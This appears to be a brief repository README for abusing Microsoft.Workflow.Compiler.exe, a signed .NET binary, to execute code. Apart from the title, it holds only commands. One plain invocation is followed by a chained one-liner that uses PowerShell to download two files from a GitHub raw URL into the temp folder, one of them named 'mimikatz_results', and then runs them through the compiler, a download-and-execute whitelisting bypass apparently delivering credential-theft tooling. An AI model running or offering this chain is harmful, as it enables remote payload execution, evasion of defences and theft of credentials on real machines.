# MicrosoftWorkflowCompiler

C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml test.xoml

cd %temp% && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/MicrosoftWorkflowCompiler/master/test.xml', '.\test.xml') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/MicrosoftWorkflowCompiler/master/mimikatz_results.xml', '.\test.xoml') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml test.xoml
